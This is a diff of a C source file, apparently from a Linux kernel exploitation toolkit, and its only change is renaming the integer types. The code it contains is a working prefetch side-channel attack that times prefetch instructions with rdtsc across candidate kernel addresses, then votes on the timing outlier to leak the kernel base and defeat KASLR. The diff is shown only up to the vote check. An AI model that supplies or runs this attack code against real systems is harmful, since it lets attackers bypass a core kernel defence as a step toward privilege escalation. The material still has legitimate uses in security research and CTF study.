@@ -3,8 +3,8 @@
 
 #include "util.h"
 
-static uint64_t measure_prefetch_time(const uint64_t addr) {
-    uint64_t ret;
+static u64 measure_prefetch_time(const u64 addr) {
+    u64 ret;
     asm volatile(
         ".intel_syntax noprefix;"
         "rdtsc;"
@@ -27,20 +27,20 @@ static uint64_t measure_prefetch_time(const uint64_t addr) {
     return ret;
 }
 
-static uint64_t find_outlier_index(const uint64_t *times, uint64_t count) {
+static u64 find_outlier_index(const u64 *times, u64 count) {
     if (count == 0) {
         return 0;
     }
 
     double mean = 0.0;
-    for (uint64_t i = 0; i < count; i++) {
+    for (u64 i = 0; i < count; i++) {
         mean += (double)times[i];
     }
     mean /= count;
 
     double max_diff = -1.0;
-    uint64_t outlier_idx = 0;
-    for (uint64_t i = 0; i < count; i++) {
+    u64 outlier_idx = 0;
+    for (u64 i = 0; i < count; i++) {
         const double diff = FABS((double)times[i] - mean);
         if (diff > max_diff) {
             max_diff = diff;
@@ -50,42 +50,42 @@ static uint64_t find_outlier_index(const uint64_t *times, uint64_t count) {
     return outlier_idx;
 }
 
-uint64_t prefetch_kbase() {
+u64 prefetch_kbase() {
     puts("[ ] finding kbase by prefetch side-channel attack");
-    uint64_t num_trials = 10;
-    const uint64_t num_vote = 10;
-    const uint64_t start = 0xffffffff81000000;
-    const uint64_t end = 0xffffffffc0000000;
-    const uint64_t step = 0x40000;
+    u64 num_trials = 10;
+    const u64 num_vote = 10;
+    const u64 start = 0xffffffff81000000;
+    const u64 end = 0xffffffffc0000000;
+    const u64 step = 0x40000;
 
-    const uint64_t num_steps = (end - start) / step;
+    const u64 num_steps = (end - start) / step;
 
     // 攻撃を num_trials 回繰り返す
     while (num_trials--) {
-        uint64_t cand_addr[num_vote];
-        uint64_t min_time[num_steps];
+        u64 cand_addr[num_vote];
+        u64 min_time[num_steps];
         // num_vote 回 prefetch side-channel 攻撃を行う
-        for (uint64_t vote = 0; vote < num_vote; vote++) {
-            for (uint64_t i = 0; i < num_steps; i++) {
+        for (u64 vote = 0; vote < num_vote; vote++) {
+            for (u64 i = 0; i < num_steps; i++) {
                 min_time[i] = UINT64_MAX;
             }
             // base address 候補を 16 回ずつ prefetch してみる
-            uint64_t num_prefetch = 16;
+            u64 num_prefetch = 16;
             while (num_prefetch--) {
-                for (uint64_t i = 0; i < num_steps; i++) {
-                    const uint64_t time = measure_prefetch_time(start + step * i);
+                for (u64 i = 0; i < num_steps; i++) {
+                    const u64 time = measure_prefetch_time(start + step * i);
                     min_time[i] = MIN(time, min_time[i]);
                 }
             }
             // 最も平均から離れているアドレスに投票
-            const uint64_t outlier_index = find_outlier_index(min_time, num_steps);
+            const u64 outlier_index = find_outlier_index(min_time, num_steps);
             cand_addr[vote] = (start + step * outlier_index) & ~0xfffff;
         }
         // 集めた候補に対して、過半数の投票があったかを確認する
-        for (uint64_t i = 0; i < num_vote; i++) {
-            const uint64_t addr = cand_addr[i];
-            uint64_t count = 0;
-            for (uint64_t j = 0; j < num_vote; j++) {
+        for (u64 i = 0; i < num_vote; i++) {
+            const u64 addr = cand_addr[i];
+            u64 count = 0;
+            for (u64 j = 0; j < num_vote; j++) {
                 if (addr == cand_addr[j]) {
                     count++;
                 }
